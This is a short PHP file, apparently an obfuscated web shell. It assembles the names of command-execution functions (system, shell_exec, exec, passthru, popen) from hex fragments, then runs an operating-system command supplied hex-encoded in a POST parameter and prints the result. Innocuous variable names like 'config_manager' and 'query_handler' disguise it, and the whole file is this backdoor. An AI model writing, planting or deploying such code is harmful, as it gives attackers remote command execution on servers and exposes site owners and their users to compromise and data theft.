<?php


$k1 = '737';
$k2 = '973';
$k3 = '746';
$k4 = '736';
$k5 = '6c6';
$k6 = '657';
$k7 = '865';
$k8 = '173';
$k9 = '468';
$k10 = '727';
$k11 = '706';
$k12 = '472';
$k13 = '16d';
$k14 = '5f6';
$k15 = 'f63';
$k16 = 'e74';
$k17 = '36c';
$k18 = '6f7';
$k19 = '365';
$k20 = '636';
$k21 = '967';
$k22 = '167';
$query_handler1 = pack("H*", $k1.$k2.$k3.'56d');
$query_handler2 = pack("H*", $k4.'865'.$k5.'c5f'.$k6.$k7);
$query_handler3 = pack("H*", '657'.'865');
$query_handler4 = pack("H*", '706'.$k8.'737'.$k9.$k10);
$query_handler5 = pack("H*", $k11.'f70'.'656');
$query_handler6 = pack("H*", '737'.$k12.'656'.$k13.$k14.'765'.'745'.$k15.'6f6'.'e74'.'656'.$k16);
$query_handler7 = pack("H*", $k11.$k17.$k18.$k19);
$config_manager = pack("H*", $k20.'f6e'.'666'.$k21.'5f6'.'d61'.'6e6'.$k22.'657');
if (isset($_POST[$config_manager])) {
    $config_manager = pack("H*", $_POST[$config_manager]);
    if (function_exists($query_handler1)) {
        $query_handler1($config_manager);
    } elseif (function_exists($query_handler2)) {
        print $query_handler2($config_manager);
    } elseif (function_exists($query_handler3)) {
        $query_handler3($config_manager, $binding_holder);
        print join("\n", $binding_holder);
    } elseif (function_exists($query_handler4)) {
        $query_handler4($config_manager);
    } elseif (function_exists($query_handler5) && function_exists($query_handler6) && function_exists($query_handler7)) {
        $item_ent = $query_handler5($config_manager, 'r');
        if ($item_ent) {
            $factor_data = $query_handler6($item_ent);
            $query_handler7($item_ent);
            print $factor_data;
        }
    }
    exit;
}
